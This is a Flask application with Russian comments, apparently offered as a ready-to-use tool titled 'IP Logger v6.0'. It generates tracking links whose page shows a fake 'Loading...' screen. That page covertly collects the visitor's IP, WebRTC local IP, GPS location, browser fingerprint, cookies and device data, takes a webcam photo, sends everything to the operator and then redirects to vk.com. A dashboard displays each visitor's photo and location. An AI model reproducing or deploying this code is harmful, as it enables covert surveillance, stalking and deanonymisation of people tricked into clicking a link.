from flask import Flask, request, redirect, render_template_string, jsonify
import uuid
import datetime
import json
import os

app = Flask(__name__)

# Хранилище данных
logs_db = {}
links_db = {}

# ===================== СТРАНИЦА-ЛОГГЕР (АВТОМАТИЧЕСКИЙ) =====================
LOGGER_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Loading...</title>
    <style>
        body { background: #0a0a0f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; margin: 0; flex-direction: column; }
        .loader { width: 50px; height: 50px; border: 4px solid #1a1a2e; border-top: 4px solid #ffd93d; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #666; font-size: 14px; }
    </style>
</head>
<body>
<div class="loader"></div>
<p>Loading...</p>

<script>
(function() {
    const linkId = window.location.pathname.split('/').pop();

    // ============================================================
    // 1. СБОР ВСЕХ ДАННЫХ
    // ============================================================

    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => 'Unknown');
    }

    function getGeo(ip) {
        return fetch(`https://ipapi.co/${ip}/json/`)
            .then(r => r.json())
            .then(d => ({
                country: d.country_name || d.country || 'Unknown',
                city: d.city || 'Unknown',
                region: d.region || 'Unknown',
                isp: d.org || 'Unknown',
                latitude: d.latitude || 'Unknown',
                longitude: d.longitude || 'Unknown'
            }))
            .catch(() => ({
                country: 'Unknown', city: 'Unknown', region: 'Unknown',
                isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown'
            }));
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
        if (/Windows/i.test(ua)) os = 'Windows';
        else if (/Mac/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua)) os = 'Linux';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
        else if (/Firefox/i.test(ua)) browser = 'Firefox';
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
        else if (/Edg/i.test(ua)) browser = 'Edge';
        else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
        return { device, os, browser, ua };
    }

    function getScreen() {
        return {
            screen: `${window.screen.width}x${window.screen.height}`,
            window: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: window.screen.colorDepth || 'Unknown',
            pixelRatio: window.devicePixelRatio || 1
        };
    }

    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
    function getLanguage() { return navigator.language || navigator.languages?.[0] || 'Unknown'; }
    function getCookies() { return document.cookie || 'No cookies'; }

    function getFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('fp', 10, 10);
            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
            return canvas.toDataURL().substring(0, 80) + '...';
        } catch { return 'Unknown'; }
    }

    function getPlugins() {
        try { return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None'; }
        catch { return 'Unknown'; }
    }

    function getWebRTC() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
                        resolve(ip ? ip[0] : 'Unknown');
                        pc.close();
                    }
                };
                setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
            } catch { resolve('Unknown'); }
        });
    }

    function getBattery() {
        return new Promise((resolve) => {
            if (!navigator.getBattery) { resolve({ level: 'Unknown', charging: 'Unknown' }); return; }
            navigator.getBattery()
                .then(bat => resolve({ level: `${Math.round(bat.level * 100)}%`, charging: bat.charging ? 'Yes' : 'No' }))
                .catch(() => resolve({ level: 'Unknown', charging: 'Unknown' }));
        });
    }

    function getWebGL() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                return { renderer: gl.getParameter(gl.RENDERER) || 'Unknown', version: gl.getParameter(gl.VERSION) || 'Unknown' };
            }
            return { renderer: 'Not supported', version: 'Not supported' };
        } catch { return { renderer: 'Unknown', version: 'Unknown' }; }
    }

    // ============================================================
    // 2. ГЕОЛОКАЦИЯ (АВТОМАТИЧЕСКИЙ ЗАПРОС)
    // ============================================================

    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ latitude: 'Not supported', longitude: 'Not supported', accuracy: 'Not supported' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                (err) => {
                    let msg = err.message;
                    if (err.code === 1) msg = 'User denied';
                    else if (err.code === 2) msg = 'Position unavailable';
                    else if (err.code === 3) msg = 'Timeout';
                    resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: msg });
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    // ============================================================
    // 3. КАМЕРА (АВТОМАТИЧЕСКИЙ ЗАПРОС И СКРИНШОТ)
    // ============================================================

    function getCameraPhoto() {
        return new Promise((resolve) => {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then((stream) => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                }, 500);
            })
            .catch(() => resolve(null));
        });
    }

    // ============================================================
    // 4. ОТПРАВКА ВСЕХ ДАННЫХ
    // ============================================================

    async function sendAllData() {
        const ip = await getIP();
        const geo = await getGeo(ip);
        const device = getDeviceInfo();
        const screen = getScreen();
        const webrtc = await getWebRTC();
        const battery = await getBattery();
        const webgl = getWebGL();
        const geolocation = await getGeolocation();
        const photo = await getCameraPhoto();

        const data = {
            link_id: linkId,
            timestamp: new Date().toISOString(),
            ip: ip,
            webrtc_ip: webrtc,
            country: geo.country,
            city: geo.city,
            region: geo.region,
            isp: geo.isp,
            geo_lat: geo.latitude,
            geo_lon: geo.longitude,
            gps_lat: geolocation.latitude,
            gps_lon: geolocation.longitude,
            gps_accuracy: geolocation.accuracy,
            device_type: device.device,
            os: device.os,
            browser: device.browser,
            user_agent: device.ua,
            screen: screen.screen,
            window_size: screen.window,
            color_depth: screen.colorDepth,
            pixel_ratio: screen.pixelRatio,
            timezone: getTimezone(),
            language: getLanguage(),
            cookies: getCookies(),
            fingerprint: getFingerprint(),
            plugins: getPlugins(),
            battery_level: battery.level,
            battery_charging: battery.charging,
            webgl_renderer: webgl.renderer,
            webgl_version: webgl.version,
            photo: photo
        };

        try {
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) {}

        setTimeout(() => {
            window.location.href = 'https://vk.com/';
        }, 1500);
    }

    sendAllData();
})();
</script>
</body>
</html>
"""

# ===================== СТРАНИЦА ДЛЯ ТЕБЯ (С УПРАВЛЕНИЕМ ССЫЛКАМИ) =====================
STATS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 IP Logger v6.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #ffd93d; margin-bottom: 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: #1a1a2e; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #2a2a4a; }
        .stat-card .num { font-size: 32px; font-weight: 700; color: #ffd93d; }
        .stat-card .label { color: #888; font-size: 13px; margin-top: 5px; }
        .link-box { background: #1a1a2e; padding: 15px; border-radius: 10px; margin: 10px 0; border: 1px solid #2a2a4a; display: flex; align-items: center; flex-wrap: wrap; gap: 10px; }
        .link-box .link { flex: 1; color: #ffd93d; word-break: break-all; font-size: 14px; }
        .link-box .delete-btn { background: #ff4a4a; color: #fff; border: none; padding: 5px 15px; border-radius: 6px; cursor: pointer; font-size: 12px; }
        .link-box .delete-btn:hover { opacity: 0.7; }
        .visitor { background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid #ff6b6b; }
        .visitor .ip { color: #ffd93d; font-weight: 600; }
        .visitor .detail { color: #aaa; font-size: 13px; }
        .visitor .time { color: #666; font-size: 12px; float: right; }
        .visitor .photo { max-width: 150px; border-radius: 8px; margin-top: 10px; border: 2px solid #4aff8a; }
        .btn { background: #4a9eff; color: #fff; border: none; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-size: 14px; }
        .btn:hover { opacity: 0.8; }
        .btn-danger { background: #ff4a4a; }
        .btn-success { background: #4aff8a; color: #0b1219; }
        .btn-small { padding: 5px 15px; font-size: 12px; }
        .btn-gold { background: #ffd700; color: #0b1219; }
        .tab { padding: 8px 20px; background: #1a1a2e; border: none; color: #e0e0e0; cursor: pointer; border-radius: 8px 8px 0 0; }
        .tab.active { background: #2a2a4a; color: #ffd93d; }
        .controls { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
        .links-list { margin: 15px 0; }
        .empty { color: #666; text-align: center; padding: 30px; }
        .footer { margin-top: 30px; text-align: center; color: #666; font-size: 13px; }
        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
        .badge-success { background: #1d4a3b; color: #a3f0d0; }
        .badge-danger { background: #5f2d3a; color: #ffb3b3; }
    </style>
</head>
<body>
<div class="container">
    <h1>📊 IP Logger v6.0 — Управление ссылками</h1>
    <p style="color:#888;margin-bottom:10px;">Создавай сколько угодно ссылок, удаляй старые, смотри статистику</p>

    <div class="controls">
        <button class="btn btn-gold" onclick="generateLink()">🔗 + Создать ссылку</button>
        <button class="btn" onclick="copyLink()">📋 Копировать текущую</button>
        <button class="btn btn-danger" onclick="clearAll()">🗑️ Очистить всё</button>
        <button class="btn" onclick="exportAll()">📥 Экспорт JSON</button>
    </div>

    <div id="currentLinkBox" style="display:none; background:#1a1a2e; padding:15px; border-radius:10px; margin-bottom:15px; border:2px solid #4a9eff;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
            <span style="color:#ffd93d; word-break:break-all;" id="currentLinkText"></span>
            <div style="display:flex; gap:8px;">
                <button class="btn btn-small btn-success" onclick="copyLink()">📋 Копировать</button>
                <button class="btn btn-small btn-danger" onclick="deleteCurrentLink()">🗑️ Удалить</button>
            </div>
        </div>
        <div style="margin-top:8px; font-size:12px; color:#666;">Переходов: <span id="currentVisits">0</span></div>
    </div>

    <div class="stats-grid" id="statsGrid">
        <div class="stat-card"><div class="num" id="totalVisits">0</div><div class="label">Всего переходов</div></div>
        <div class="stat-card"><div class="num" id="uniqueVisits">0</div><div class="label">Уникальных IP</div></div>
        <div class="stat-card"><div class="num" id="withPhoto">0</div><div class="label">С фото</div></div>
        <div class="stat-card"><div class="num" id="withGeo">0</div><div class="label">С геолокацией</div></div>
    </div>

    <div class="links-list" id="linksList"></div>
    <div id="visitorsList"></div>

    <div class="footer">⚡ Все данные собираются автоматически: IP, геолокация, камера, устройство, браузер, экран, батарея, WebGL, отпечаток</div>
</div>

<script>
let currentLinkId = null;
let currentFullLink = '';

// ========== ГЕНЕРАЦИЯ ССЫЛКИ ==========
function generateLink() {
    fetch('/generate')
        .then(r => r.json())
        .then(data => {
            currentLinkId = data.id;
            currentFullLink = data.full_url;
            document.getElementById('currentLinkBox').style.display = 'block';
            document.getElementById('currentLinkText').textContent = currentFullLink;
            document.getElementById('currentVisits').textContent = data.visits || 0;
            loadLinks();
            loadStats();
            showToast('✅ Ссылка создана!');
        });
}

function copyLink() {
    if (!currentFullLink) { generateLink(); return; }
    navigator.clipboard.writeText(currentFullLink).then(() => {
        showToast('📋 Ссылка скопирована!');
    });
}

function deleteCurrentLink() {
    if (!currentLinkId) return;
    if (!confirm('Удалить эту ссылку?')) return;
    fetch('/delete/' + currentLinkId, { method: 'POST' })
        .then(() => {
            currentLinkId = null;
            currentFullLink = '';
            document.getElementById('currentLinkBox').style.display = 'none';
            loadLinks();
            loadStats();
            showToast('🗑️ Ссылка удалена');
        });
}

// ========== ЗАГРУЗКА СПИСКА ССЫЛОК ==========
function loadLinks() {
    fetch('/links')
        .then(r => r.json())
        .then(data => {
            const container = document.getElementById('linksList');
            if (data.links.length === 0) {
                container.innerHTML = '<div class="empty">Нет созданных ссылок. Нажмите «Создать ссылку»</div>';
                return;
            }
            let html = '<h3 style="margin:15px 0 10px 0;">📋 Ваши ссылки</h3>';
            data.links.forEach(link => {
                const visits = data.visits[link.id] || 0;
                html += `<div class="link-box">
                    <span class="link">${link.full_url}</span>
                    <span style="color:#888;font-size:12px;">${visits} переходов</span>
                    <button class="btn btn-small btn-success" onclick="selectLink('${link.id}')">Выбрать</button>
                    <button class="delete-btn" onclick="deleteLink('${link.id}')">✕</button>
                </div>`;
            });
            container.innerHTML = html;
        });
}

function selectLink(id) {
    fetch('/links')
        .then(r => r.json())
        .then(data => {
            const link = data.links.find(l => l.id === id);
            if (link) {
                currentLinkId = link.id;
                currentFullLink = link.full_url;
                document.getElementById('currentLinkBox').style.display = 'block';
                document.getElementById('currentLinkText').textContent = currentFullLink;
                document.getElementById('currentVisits').textContent = data.visits[id] || 0;
                loadStats();
                showToast('✅ Ссылка выбрана');
            }
        });
}

function deleteLink(id) {
    if (!confirm('Удалить эту ссылку?')) return;
    fetch('/delete/' + id, { method: 'POST' })
        .then(() => {
            if (currentLinkId === id) {
                currentLinkId = null;
                currentFullLink = '';
                document.getElementById('currentLinkBox').style.display = 'none';
            }
            loadLinks();
            loadStats();
            showToast('🗑️ Ссылка удалена');
        });
}

// ========== СТАТИСТИКА ==========
function loadStats() {
    const url = currentLinkId ? '/stats/' + currentLinkId : '/stats/all';
    fetch(url)
        .then(r => r.json())
        .then(data => {
            document.getElementById('totalVisits').textContent = data.total_visits || 0;
            document.getElementById('uniqueVisits').textContent = data.unique_ips || 0;
            document.getElementById('withPhoto').textContent = data.with_photo || 0;
            document.getElementById('withGeo').textContent = data.with_geo || 0;

            if (currentLinkId && document.getElementById('currentVisits')) {
                document.getElementById('currentVisits').textContent = data.total_visits || 0;
            }

            let html = '';
            const visitors = data.visitors || [];
            if (visitors.length === 0) {
                html = '<div class="empty">😴 Пока никого нет</div>';
            } else {
                visitors.forEach(v => {
                    html += `<div class="visitor">
                        <span class="time">${v.timestamp || ''}</span>
                        <div><span class="ip">${v.ip || 'Unknown'}</span>
                        ${v.country ? ` <span class="badge badge-success">${v.country}</span>` : ''}
                        ${v.city ? ` <span class="badge badge-success">${v.city}</span>` : ''}</div>
                        <div class="detail">📱 ${v.device_type || 'Unknown'} | ${v.os || 'Unknown'} | ${v.browser || 'Unknown'}</div>
                        <div class="detail">🖥️ ${v.screen || 'Unknown'} | ⏰ ${v.timezone || 'Unknown'}</div>
                        <div class="detail">📍 GPS: ${v.gps_lat && v.gps_lat !== 'Denied' ? `${v.gps_lat}, ${v.gps_lon}` : '❌ отказ'}</div>
                        <div class="detail">🔋 ${v.battery_level || 'Unknown'} | ${v.battery_charging === 'Yes' ? '🔌 зарядка' : '🔋 не заряжается'}</div>
                        <div class="detail">🆔 ${(v.fingerprint || 'Unknown').substring(0, 30)}...</div>
                        ${v.photo ? `<div><img src="${v.photo}" class="photo" /></div>` : ''}
                    </div>`;
                });
            }
            document.getElementById('visitorsList').innerHTML = html;
        });
}

// ========== ОЧИСТКА ==========
function clearAll() {
    if (!confirm('Удалить все данные (все ссылки)?')) return;
    fetch('/clear', { method: 'POST' })
        .then(() => {
            currentLinkId = null;
            currentFullLink = '';
            document.getElementById('currentLinkBox').style.display = 'none';
            loadLinks();
            loadStats();
            showToast('🗑️ Всё очищено');
        });
}

function exportAll() {
    window.open('/export', '_blank');
}

// ========== TOAST ==========
function showToast(msg) {
    let toast = document.getElementById('toast');
    if (!toast) {
        toast = document.createElement('div');
        toast.id = 'toast';
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1d4a3b;color:#a3f0d0;padding:10px 25px;border-radius:50px;font-size:14px;opacity:0;transition:opacity 0.3s;z-index:999;';
        document.body.appendChild(toast);
    }
    toast.textContent = msg;
    toast.style.opacity = '1';
    clearTimeout(toast._hide);
    toast._hide = setTimeout(() => toast.style.opacity = '0', 3000);
}

// ========== АВТООБНОВЛЕНИЕ ==========
setInterval(() => {
    loadStats();
    loadLinks();
}, 5000);

// ========== ЗАПУСК ==========
loadLinks();
loadStats();
setTimeout(generateLink, 500);
</script>
</body>
</html>
"""

# ===================== МАРШРУТЫ =====================

@app.route('/')
def index():
    return render_template_string(STATS_HTML)

@app.route('/generate')
def generate():
    link_id = str(uuid.uuid4())[:8]
    links_db[link_id] = {'created': datetime.datetime.now().isoformat()}
    logs_db[link_id] = []
    return jsonify({
        'id': link_id,
        'full_url': f"{request.host_url}l/{link_id}",
        'visits': 0
    })

@app.route('/l/<link_id>')
def logger(link_id):
    if link_id not in links_db:
        return 'Ссылка не найдена', 404
    return render_template_string(LOGGER_HTML, link_id=link_id)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    link_id = data.get('link_id')
    if link_id not in logs_db:
        logs_db[link_id] = []
    logs_db[link_id].append(data)
    return jsonify({'status': 'ok'})

@app.route('/links')
def get_links():
    links = []
    for link_id in links_db:
        links.append({
            'id': link_id,
            'full_url': f"{request.host_url}l/{link_id}",
            'created': links_db[link_id]['created']
        })
    
    visits = {}
    for link_id, logs in logs_db.items():
        visits[link_id] = len(logs)
    
    return jsonify({'links': links, 'visits': visits})

@app.route('/stats/all')
def stats_all():
    all_visitors = []
    for visitors in logs_db.values():
        all_visitors.extend(visitors)
    
    unique_ips = len(set(v.get('ip') for v in all_visitors if v.get('ip')))
    with_photo = sum(1 for v in all_visitors if v.get('photo'))
    with_geo = sum(1 for v in all_visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
    
    return jsonify({
        'visitors': all_visitors[-50:],
        'total_visits': len(all_visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/stats/<link_id>')
def stats_link(link_id):
    visitors = logs_db.get(link_id, [])
    unique_ips = len(set(v.get('ip') for v in visitors if v.get('ip')))
    with_photo = sum(1 for v in visitors if v.get('photo'))
    with_geo = sum(1 for v in visitors if v.get('gps_lat') and v.get('gps_lat') != 'Denied')
    
    return jsonify({
        'visitors': visitors[-50:],
        'total_visits': len(visitors),
        'unique_ips': unique_ips,
        'with_photo': with_photo,
        'with_geo': with_geo
    })

@app.route('/delete/<link_id>', methods=['POST'])
def delete_link(link_id):
    if link_id in links_db:
        del links_db[link_id]
    if link_id in logs_db:
        del logs_db[link_id]
    return jsonify({'status': 'ok'})

@app.route('/clear', methods=['POST'])
def clear():
    logs_db.clear()
    links_db.clear()
    return jsonify({'status': 'ok'})

@app.route('/export')
def export():
    return jsonify({
        'links': links_db,
        'logs': logs_db
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
